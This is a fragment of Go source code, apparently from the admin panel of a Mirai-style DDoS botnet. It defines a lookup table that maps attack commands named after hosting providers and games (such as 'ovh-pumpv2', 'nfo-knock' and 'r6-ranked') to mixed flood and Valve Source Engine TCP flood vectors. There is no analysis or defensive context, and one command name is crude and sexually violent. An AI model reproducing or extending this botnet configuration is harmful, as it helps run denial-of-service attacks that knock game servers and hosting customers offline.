...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "./100-gonev2": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
    "./ovh-pumpv2": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
        "./ob-killall": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
        "./fivemrape": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
        ...
        "./r6-ranked": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood",
    },
        "./2k-freeze": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood",
    },
        ...
        "./tcp-pappy": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
        "./nfo-knock": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
        "./stello-dead": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "Multiple Floods Mixed",
    },
